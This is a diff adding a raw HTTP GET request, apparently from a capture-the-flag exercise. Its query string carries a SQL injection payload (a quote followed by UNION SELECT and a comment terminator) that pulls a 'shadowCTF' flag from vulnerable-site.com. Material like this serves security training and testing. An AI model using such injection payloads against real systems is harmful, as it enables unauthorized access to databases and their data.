@@ -1,0 +1,5 @@
+GET /vuln?id=1' UNION SELECT 'shadowCTF{SQL_injection_master}'-- HTTP/1.1
+Host: vulnerable-site.com
+User-Agent: Mozilla/5.0
+Accept: */*
+Connection: close
